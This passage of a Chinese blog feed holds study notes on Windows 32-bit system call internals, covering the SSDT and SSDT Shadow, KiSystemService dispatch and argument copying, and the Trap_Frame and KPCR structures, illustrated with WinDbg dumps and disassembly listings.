    <content type="html"><![CDATA[<p>来学习一下系统描述符表这个结构</p><span id="more"></span><h2 id="SSDT"><a href="#SSDT" class="headerlink" title="SSDT"></a>SSDT</h2><p><code>SSDT</code>的全称是<code>System Services Descriptor Table</code>，意为系统服务描述符表。我们可以通过<code>ETHREAD</code>结构体加偏移的方式进行访问。在内核文件中，有一个变量是导出的：<code>KeServiceDescriptorTable</code>。通过它我们可以访问<code>SSDT</code>。</p><p>可以看看在内核中看看 SSDT 是什么样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line">83d84a80  83c7f940 00000000 00000192 83c7ff8c</span><br><span class="line">83d84a90  00000000 00000000 00000000 00000000</span><br><span class="line">83d84aa0  00000000 023fd0c0 000000bb 00000011</span><br><span class="line">83d84ab0  5385d2ba d717548f 00000100 00000000</span><br><span class="line">83d84ac0  83c7f940 00000000 00000192 83c7ff8c</span><br><span class="line">83d84ad0  99e6a000 00000000 00000339 99e6b02c</span><br><span class="line">83d84ae0  00000000 00000340 00000340 00000000</span><br><span class="line">83d84af0  00000007 00000000 8691c9c8 8691c900</span><br></pre></td></tr></table></figure><p>再来看看结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_ServiceDescriptorTable</span> &#123;</span><br><span class="line">    PVOID ServiceTableBase;</span><br><span class="line">    PVOID ServiceCounterTable;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> NumberOfServices;</span><br><span class="line">    PVOID ParamTableBase;</span><br><span class="line">&#125;*PServiceDescriptorTable;</span><br></pre></td></tr></table></figure><p>对应起来我们不难得到，当前系统的 SSDT 有 0x192 个函数，基址表在 <code>83c7f940</code>，参数个数表在 <code>83c7ff8c</code>，计数器表设为了 0 表示对此不感兴趣。</p><p>根据本篇章的第一节也可以看出来，我们调用的 <code>ReadProcessMemory</code> 系统调用号为 0x115，对应寻找一下函数基址和参数个数。</p><img src="/2025/01/24/WindowsSyscall4/1.png" class=""><p>可以找到 <code>NtReadVirtualMemory</code> 函数地址和 0x14 参数字节数，刚好 5 个 4 字节。</p><p>该符号导出了，如果要在驱动程序中直接使用，则需要申明。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;</span><br></pre></td></tr></table></figure><h2 id="SSDTShadow"><a href="#SSDTShadow" class="headerlink" title="SSDTShadow"></a>SSDTShadow</h2><p><code>SSDTShadow</code>和<code>SSDT</code>不一样的是它并没有从内核文件导出。不过我们还是可以从<code>WinDbg</code>找到它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTableShadow</span><br><span class="line">83d84ac0  83c7f940 00000000 00000192 83c7ff8c</span><br><span class="line">83d84ad0  99e6a000 00000000 00000339 99e6b02c</span><br><span class="line">83d84ae0  00000000 00000340 00000340 00000000</span><br><span class="line">83d84af0  00000007 00000000 8691c9c8 8691c900</span><br><span class="line">83d84b00  8690c900 8691c838 8690c9c8 00000000</span><br><span class="line">83d84b10  8690c838 00000000 00000000 83c79039</span><br><span class="line">83d84b20  83c8c485 83cb29a5 00000003 86850000</span><br><span class="line">83d84b30  86851000 00000120 00000000 ffffffff</span><br></pre></td></tr></table></figure><p>它的结构和<code>SSDT</code>是一模一样的，只不过它多了一张表，就是少的那个与<code>GUI</code>相关的服务表。</p><h2 id="SSDThook"><a href="#SSDThook" class="headerlink" title="SSDThook"></a>SSDThook</h2><p>无论是自己伪造一张表还是直接修改表，都可以达到劫持 API 的目的，然而这些已经是过去式了，现在微软已经不允许 SSDT Hook 了。由于笔者本地没有 Windows7 32位的驱动，所以这个实验也不太好做了。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15563970.html">https://www.cnblogs.com/wingsummer/p/15563970.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下系统描述符表这个结构</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——调用细节与系统服务表</title>
    <link href="https://xia0ji233.github.io/2025/01/22/WindowsSyscall3/"/>
    <id>https://xia0ji233.github.io/2025/01/22/WindowsSyscall3/</id>
    <published>2025-01-22T08:00:00.000Z</published>
    <updated>2025-01-22T08:43:18.755Z</updated>
    
    <content type="html"><![CDATA[<p>来深入挖掘一下Windows系统调用的过程</p><span id="more"></span><h2 id="KiSystemService分析"><a href="#KiSystemService分析" class="headerlink" title="KiSystemService分析"></a>KiSystemService分析</h2><p>这个函数是通过中断门进的，中断门本身保存了 <code>CS</code> 和 <code>EIP</code>，跨段提权后通过 TSS 拿到零环的 <code>SS</code> 和 <code>ESP</code>。此时为了维护三环的上下文状态，则会将各种寄存器保存到堆栈，也就是 <code>Trap_Frame</code> 结构体，中断门提权之后本身就会按顺序压入 <code>SS</code>，<code>ESP</code>，<code>ELFAGS</code>，<code>CS</code>，<code>EIP</code>。此时比较一下上一篇文章中提到的 <code>Trap_Frame</code> 结构图，大概就能知道为什么这么排布了，随后系统调用的入口则会按顺序保存这些信息。</p><img src="/2025/01/22/WindowsSyscall3/1.png" class=""><p>开头的一堆 <code>push</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00434FEA 6A 00                                   push    0</span><br><span class="line">.text:00434FEC 55                                      push    ebp</span><br><span class="line">.text:00434FED 53                                      push    ebx</span><br><span class="line">.text:00434FEE 56                                      push    esi</span><br><span class="line">.text:00434FEF 57                                      push    edi</span><br><span class="line">.text:00434FF0 0F A0                                   push    fs</span><br></pre></td></tr></table></figure><p>正对应了结构体的 <code>ErrorCode</code>，<code>Ebp</code>，<code>Ebx</code>，<code>Esi</code>，<code>Edi</code>，<code>SegFs</code>。</p><p>随后对应也将 FS 切换到了 R0 的值 0x30，再把对应的 <code>ExceptionList</code> 和 <code>PreviousPreviousMode</code> 压入，也就是这里的 <code>fs:[0</code>] 和 <code>[fs:[0x124]+0x13A]</code>。</p><p><code>fs</code> 前面说过了，是在 R3 指向 TEB 的段选择子，它的基址就在 TEB 上，在 R0 会指向 <code>KPCR</code> 结构，这个结构上篇文章分析过了，那么来看看<code>fs:[0]</code> 和 <code>[[KPCR+0x124]+0x13A]</code> 的值是否如我们所想，根据上篇文章的分析，可以得知 <code>fs:[0]</code> 就是 <code>ExceptionList</code> 字段，而 <code>fs:[0x124]</code> 指向 <code>CurrentThread</code> 成员，而 <code>KTHREAD+0x13A</code> 正是当前线程的 <code>PreviousMode</code> 字段，完美对应上。压入之后，还会给当前 <code>ExceptionList</code> 赋值为 -1。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00435022 83 EC 48                                sub     esp, 48h</span><br><span class="line">.text:00435025 8B 5C 24 6C                             mov     ebx, dword ptr [esp+68h+arg_0]</span><br><span class="line">.text:00435029 83 E3 01                                and     ebx, 1</span><br><span class="line">.text:0043502C 88 9E 3A 01 00 00                       mov     [esi+13Ah], bl</span><br><span class="line">.text:00435032 8B EC                                   mov     ebp, esp</span><br><span class="line">.text:00435034 8B 9E 28 01 00 00                       mov     ebx, [esi+128h]</span><br><span class="line">.text:0043503A 89 5D 3C                                mov     [ebp+3Ch], ebx</span><br><span class="line">.text:0043503D F6 45 6C 01                             test    byte ptr [ebp+6Ch], 1</span><br><span class="line">.text:00435041 75 1E                                   jnz     short loc_435061</span><br><span class="line">.text:00435043 0F AE E8                                lfence</span><br><span class="line">.text:00435046 E9 A8 01 00 00                          jmp     loc_4351F3</span><br></pre></td></tr></table></figure><p>保存完成这些字段之后， <code>esp</code> 额外被减了 <code>0x48</code>，刚好是 Trap_Frame 剩余字段的大小（不包括虚拟8086模式的字段）。将 Ebp 提上来，随后拿到 <code>CurrentThread+0x128</code>，通过查找可以得知是 <code>Trap_Frame</code> 指针，保存到了 <code>ebp+0x3C</code> 的位置上，此时 <code>ESP</code> 指向了栈中保存的 <code>Trap_Frame</code> 结构，也就是将 <code>CurrentThread</code>  的 <code>Trap_Frame</code> 存到了栈中的 <code>Trap_Frame+0x3C</code>，<code>Edx</code> 字段所处的位置。</p><p>随后拿到栈中 <code>Trap_Frame</code> 中的 <code>SegCs</code> 字段（+0x6C），<code>&amp;1</code> 后判断是否为 0，因为 Windows 没有实现 R1 和 R2，所以这里可以简单认为如果发出中断的线程不为内核线程则跳转。通常情况下，发出系统调用的线程都是 R3 的，所以着重分析跳转的分支。（To Be Continued…）</p><h2 id="SystemServiceTable"><a href="#SystemServiceTable" class="headerlink" title="SystemServiceTable"></a>SystemServiceTable</h2><p>之前我们讲到进0环后，3环的各种寄存器的值都会保留到<code>_Trap_Frame</code>结构体中，接下来我将会讲解：如何根据系统服务号（eax中存储）找到要执行的内核函数？调用时参数是存储到3环的堆栈，如何传递给内核函数？首先我们得知道一个结构体，用来描述内核函数信息的表：<code>SystemServiceTable</code>，即系统服务表</p><img src="/2025/01/22/WindowsSyscall3/2.png" class=""><p>可以看出这个表由4部分组成，<code>ServiceTable</code>指向的是函数地址数组，每个成员四个字节；<code>Count</code>表示调用次数，没啥意义；<code>ServiceLimit</code>表示这张表有几个函数；<code>ArgumentTable</code>指向对应函数有几个字节参数，每个成员一个字节。</p><p>从图中可以看出，<code>Windows</code>提供了两张表：上面的表是用来处理一般内核函数的，下面这张表是用来处理与<code>GUI</code>相关的内核函数。</p><p>这个表会存在 <code>ETHREAD+0xbc</code> （ETHREAD的头部就是KTHREAD）偏移的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   //...</span><br><span class="line">   +0x0b8 ThreadFlags      : Int4B</span><br><span class="line">   +0x0bc ServiceTable     : Ptr32 Void</span><br><span class="line">   //...</span><br></pre></td></tr></table></figure><p>拿到了系统调用号如何去寻找对应的系统函数呢，看如下示意图</p><img src="/2025/01/22/WindowsSyscall3/3.png" class=""><h2 id="APIService分析"><a href="#APIService分析" class="headerlink" title="APIService分析"></a>APIService分析</h2><p>从系统调用的代码往后分析，可以找到系统调用入口对调用号的处理</p><img src="/2025/01/22/WindowsSyscall3/4.png" class=""><p>顺着看一遍</p><p>其中 <code>ESI+0xBC</code> 就对应了线程的 <code>ServiceTable</code> 成员，加上 <code>edi</code> 刚刚好，因为表的大小刚好就是 0x10，所以如果是这里直接加上去，<code>edi</code> 的结果只能是 <code>0</code> 或者 <code>0x10</code>，这样加上去 <code>edi</code> 最终都指向了正确的表。</p><p>然后拿到 <code>eax</code> 与 <code>ServiceLimit</code> 相比较，如果 <code>eax&gt;=ServiceLimit</code> 则直接报错，很好理解。</p><p>随后 <code>(eax&gt;&gt;8 &amp; 0x10)==0x10</code> 其实就是判断第 12 位是否为1，如果为 1 则走 <code>loc_4354F8</code> 分支调用 <code>win32k.sys</code> 的函数，我们直接往下分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">.text:004354E6                         _KiSystemServiceAccessTeb@0 proc near   ; DATA XREF: KiPreprocessAccessViolation(x,x,x)+3D↓o</span><br><span class="line">.text:004354E6</span><br><span class="line">.text:004354E6                         ; FUNCTION CHUNK AT .text:0043579E SIZE 0000000A BYTES</span><br><span class="line">.text:004354E6</span><br><span class="line">.text:004354E6 0B B1 70 0F 00 00                       or      esi, [ecx+0F70h]</span><br><span class="line">.text:004354EC 74 0A                                   jz      short loc_4354F8</span><br><span class="line">.text:004354EE 52                                      push    edx</span><br><span class="line">.text:004354EF 50                                      push    eax</span><br><span class="line">.text:004354F0 FF 15 0C 5A 56 00                       call    ds:_KeGdiFlushUserBatch</span><br><span class="line">.text:004354F6 58                                      pop     eax</span><br><span class="line">.text:004354F7 5A                                      pop     edx</span><br><span class="line">.text:004354F8</span><br><span class="line">.text:004354F8                         loc_4354F8:                             ; CODE XREF: KiEndUnexpectedRange()+63C↑j</span><br><span class="line">.text:004354F8                                                                 ; KiSystemServiceAccessTeb()+6↑j</span><br><span class="line">.text:004354F8 64 FF 05 B0 06 00 00                    inc     large dword ptr fs:6B0h</span><br><span class="line">.text:004354FF 8B F2                                   mov     esi, edx</span><br><span class="line">.text:00435501 33 C9                                   xor     ecx, ecx</span><br><span class="line">.text:00435503 8B 57 0C                                mov     edx, [edi+0Ch]</span><br><span class="line">.text:00435506 8B 3F                                   mov     edi, [edi]</span><br><span class="line">.text:00435508 8A 0C 10                                mov     cl, [eax+edx]</span><br><span class="line">.text:0043550B 8B 14 87                                mov     edx, [edi+eax*4]</span><br><span class="line">.text:0043550E 2B E1                                   sub     esp, ecx</span><br><span class="line">.text:00435510 C1 E9 02                                shr     ecx, 2</span><br><span class="line">.text:00435513 8B FC                                   mov     edi, esp</span><br><span class="line">.text:00435515 F6 45 72 02                             test    byte ptr [ebp+72h], 2</span><br><span class="line">.text:00435519 75 06                                   jnz     short loc_435521</span><br><span class="line">.text:0043551B F6 45 6C 01                             test    byte ptr [ebp+6Ch], 1</span><br><span class="line">.text:0043551F 74 0C                                   jz      short _KiSystemServiceCopyArguments@0 ; KiSystemServiceCopyArguments()</span><br><span class="line">.text:00435521</span><br><span class="line">.text:00435521                         loc_435521:                             ; CODE XREF: KiSystemServiceAccessTeb()+33↑j</span><br><span class="line">.text:00435521 3B 35 34 58 56 00                       cmp     esi, ds:_MmUserProbeAddress</span><br><span class="line">.text:00435527 0F 83 71 02 00 00                       jnb     loc_43579E</span><br><span class="line">.text:00435527                         _KiSystemServiceAccessTeb@0 endp</span><br><span class="line">.text:00435527</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D                         ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D                         ; int __usercall KiSystemServiceCopyArguments@&lt;eax&gt;(void (*)(void)@&lt;edx&gt;, int@&lt;ecx&gt;, unsigned int@&lt;ebx&gt;, int@&lt;ebp&gt;, void *@&lt;edi&gt;, const void *@&lt;esi&gt;)</span><br><span class="line">.text:0043552D                         _KiSystemServiceCopyArguments@0 proc near</span><br><span class="line">.text:0043552D                                                                 ; CODE XREF: KiSystemServiceAccessTeb()+39↑j</span><br><span class="line">.text:0043552D                                                                 ; DATA XREF: KiPreprocessAccessViolation(x,x,x):loc_4D84BC↓o</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D                         ; FUNCTION CHUNK AT .text:00435964 SIZE 0000000C BYTES</span><br><span class="line">.text:0043552D</span><br><span class="line">.text:0043552D F3 A5                                   rep movsd</span><br><span class="line">.text:0043552F F6 45 6C 01                             test    byte ptr [ebp+6Ch], 1</span><br><span class="line">.text:00435533 74 16                                   jz      short loc_43554B</span><br><span class="line">.text:00435535 64 8B 0D 24 01 00 00                    mov     ecx, large fs:124h</span><br><span class="line">.text:0043553C 8B 3C 24                                mov     edi, [esp+0]</span><br><span class="line">.text:0043553F 89 99 3C 01 00 00                       mov     [ecx+13Ch], ebx</span><br><span class="line">.text:00435545 89 B9 2C 01 00 00                       mov     [ecx+12Ch], edi</span><br><span class="line">.text:0043554B</span><br><span class="line">.text:0043554B                         loc_43554B:                             ; CODE XREF: KiSystemServiceCopyArguments()+6↑j</span><br><span class="line">.text:0043554B 8B DA                                   mov     ebx, edx</span><br><span class="line">.text:0043554D F6 05 C8 2F 53 00 40                    test    byte ptr ds:dword_532FC8, 40h</span><br><span class="line">.text:00435554 0F 95 45 12                             setnz   byte ptr [ebp+12h]</span><br><span class="line">.text:00435558 0F 85 06 04 00 00                       jnz     loc_435964</span><br><span class="line">.text:0043555E</span><br><span class="line">.text:0043555E                         loc_43555E:                             ; CODE XREF: KiSystemServiceCopyArguments()+43E↓j</span><br><span class="line">.text:0043555E FF D3                                   call    ebx</span><br><span class="line">.text:0043555E                         _KiSystemServiceCopyArguments@0 endp</span><br></pre></td></tr></table></figure><p>然后已经知道了 <code>edi</code> 指向了正确的表 <code>mov edi,[edi]</code> 就让 <code>edi</code> 指向了函数表，<code>mov edx,[edi+eax*4]</code> 随后通过 <code>eax</code> 选择执行的函数，最后 <code>call</code>。</p><p>上面还有一个步骤是复制参数，因为中断门进来的参数还在 R3，并没有被带到 R0，复制参数是通过：</p><p><code>mov edx,[edi+0Ch]</code> 拿到参数个数表，再 <code>mov cl,[eax+edx]</code> 拿到具体参数字节数，然后 <code>shr ecx,2</code> 右移两位得到参数个数（假设所有参数都是四字节大小）。然后前面分别给 <code>edi</code> 和 <code>esi</code> 赋值，最后使用了 <code>rep movsd</code> 指令，这个指令会根据 <code>ecx</code> 的值为步长，每次从 <code>esi</code> 指向的地址搬运四个字节到 <code>edi</code> 指向的地址，所以搬运参数仅通过这一条指令就完成了。</p><p>至此我们分析完了系统调用的入口。</p><p>后续还需要分析函数调用完成之后退出系统调用的过程，由于这一部分知识需要学习 APC 之后才能看，所以今天就到这里，分析完一遍系统调用的过程收获还是挺大的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_3">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_3</a></li><li>[2]：<a href="https://www.cnblogs.com/wingsummer/p/15543945.html">https://www.cnblogs.com/wingsummer/p/15543945.html</a></li><li>[3]：<a href="https://www.cnblogs.com/wingsummer/p/15558928.html">https://www.cnblogs.com/wingsummer/p/15558928.html</a></li></ul>]]></content>
    
    
    <summary type="html">来深入挖掘一下Windows系统调用的过程</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——调用相关结构体学习</title>
    <link href="https://xia0ji233.github.io/2025/01/22/WindowsSyscall2/"/>
    <id>https://xia0ji233.github.io/2025/01/22/WindowsSyscall2/</id>
    <published>2025-01-22T02:00:00.000Z</published>
    <updated>2025-01-22T03:21:07.481Z</updated>
    
    <content type="html"><![CDATA[<p>来深入挖掘一下Windows系统调用的过程</p><span id="more"></span><h2 id="相关结构体介绍"><a href="#相关结构体介绍" class="headerlink" title="相关结构体介绍"></a>相关结构体介绍</h2><h3 id="Trap-Frame"><a href="#Trap-Frame" class="headerlink" title="Trap_Frame"></a>Trap_Frame</h3><p>首先第一个要讲的是 Trap_Frame 结构，如下图所示。</p><img src="/2025/01/22/WindowsSyscall2/1.png" class=""><p>栈帧结构体，用于 <code>Windows API</code> 保存现场。经过提权进入0环的时候，<code>Windows</code>就会遵守这个结构体保存一系列的数据，最后四个成员用于虚拟8086模式下，不属于保护模式的范畴。</p><p>中断发生时，若发生权限变换，则要保存旧堆栈，<code>CPU</code>压入的，由 <code>HardwareEsp</code> 和 <code>HardwareSegSs</code> 两个成员保存。</p><p>中断发生时，保存被中断的代码段和<code>iret</code>要返回的地址，<code>CPU</code>压入的，由 <code>Eip</code>，<code>SegCs</code> 和 <code>EFlags</code> 三个成员保存。</p><p><code>Windows</code> 中<strong>非易失性寄存器</strong>需要在中断例程中先保存，其中<strong>非易失性寄存器</strong>指的是在调用之前和调用之后仍然会保持原值的寄存器。通常来说，调用例程会选择要么不去写这些寄存器，如果一定要写寄存器，则会通过堆栈在调用之前保存该值，调用结束之后重新取回。</p><h3 id="KPCR"><a href="#KPCR" class="headerlink" title="KPCR"></a>KPCR</h3><p><code>kpcr</code>：<code>cpu</code> 核控制块，<code>cpu</code> 一个核一个 <code>kpcr</code> 结构，<code>fs=0x30</code> 在内核中的时候，指向的是 <code>kpcr</code> 结构，<code>fs=0x3b</code> 在应用层的时候，指向的是当前线程的 <code>TEB</code></p><p><code>KPCR</code> 里面还嵌套着两个结构体 <code>TIB</code> 和 <code>KPRCB</code>。</p><p>查看计算机有多少核：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors L1</span><br><span class="line">83daaa2c  00000001</span><br></pre></td></tr></table></figure><p>查看 <code>KPCR</code> 结构体可以通过 <code>KiProcessorBlock</code> 数组得到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KiProcessorBlock</span><br><span class="line">83daa980  80b97120 00000000 00000000 00000000</span><br><span class="line">83daa990  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9a0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9b0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9c0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9d0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9e0  00000000 00000000 00000000 00000000</span><br><span class="line">83daa9f0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>因为只有一个核，所以看到只存储了一个 <code>KPCR</code> 指针，用 <code>dt</code> 命令查看结构体值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_KPCR 80b97000</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x000 Used_ExceptionList : 0xa8d2706c _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 Used_StackBase   : (null) </span><br><span class="line">   +0x008 Spare2           : (null) </span><br><span class="line">   +0x00c TssCopy          : 0x80b93c00 Void</span><br><span class="line">   +0x010 ContextSwitches  : 0x35bf7</span><br><span class="line">   +0x014 SetMemberCopy    : 1</span><br><span class="line">   +0x018 Used_Self        : 0x7ffda000 Void</span><br><span class="line">   +0x01c SelfPcr          : 0x80b97000 _KPCR</span><br><span class="line">   +0x020 Prcb             : 0x80b97120 _KPRCB</span><br><span class="line">   +0x024 Irql             : 0x1f &#x27;&#x27;</span><br><span class="line">   +0x028 IRR              : 0</span><br><span class="line">   +0x02c IrrActive        : 0</span><br><span class="line">   +0x030 IDR              : 0xffffffff</span><br><span class="line">   +0x034 KdVersionBlock   : 0x83d6f5c0 Void</span><br><span class="line">   +0x038 IDT              : 0x80b93000 _KIDTENTRY</span><br><span class="line">   +0x03c GDT              : 0x80b93800 _KGDTENTRY</span><br><span class="line">   +0x040 TSS              : 0x80b93c00 _KTSS</span><br><span class="line">   +0x044 MajorVersion     : 1</span><br><span class="line">   +0x046 MinorVersion     : 1</span><br><span class="line">   +0x048 SetMember        : 1</span><br><span class="line">   +0x04c StallScaleFactor : 0x973</span><br><span class="line">   +0x050 SpareUnused      : 0 &#x27;&#x27;</span><br><span class="line">   +0x051 Number           : 0 &#x27;&#x27;</span><br><span class="line">   +0x052 Spare0           : 0 &#x27;&#x27;</span><br><span class="line">   +0x053 SecondLevelCacheAssociativity : 0 &#x27;&#x27;</span><br><span class="line">   +0x054 VdmAlert         : 0</span><br><span class="line">   +0x058 KernelReserved   : [14] 0</span><br><span class="line">   +0x090 SecondLevelCacheSize : 0</span><br><span class="line">   +0x094 HalReserved      : [16] 0x1000000</span><br><span class="line">   +0x0d4 InterruptMode    : 0</span><br><span class="line">   +0x0d8 Spare1           : 0 &#x27;&#x27;</span><br><span class="line">   +0x0dc KernelReserved2  : [17] 0</span><br><span class="line">   +0x120 PrcbData         : _KPRCB</span><br></pre></td></tr></table></figure><p>把里面存入的两个结构体 <code>_NT_TIB</code> 和 <code>_KPRCB</code> 介绍一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_NT_TIB 0xa8d2706c</span><br><span class="line">   +0x000 ExceptionList    : 0xa8d270d4 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 StackBase        : 0x83cfe4a2 Void</span><br><span class="line">   +0x008 StackLimit       : 0x5396aa78 Void</span><br><span class="line">   +0x00c SubSystemTib     : (null) </span><br><span class="line">   +0x010 FiberData        : 0xa8d270e4 Void</span><br><span class="line">   +0x010 Version          : 0xa8d270e4</span><br><span class="line">   +0x014 ArbitraryUserPointer : 0x83cf9851 Void</span><br><span class="line">   +0x018 Self             : 0x00000004 _NT_TIB</span><br></pre></td></tr></table></figure><p>其中 <code>_KPRCB</code> 是直接包含而不是用指针引用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 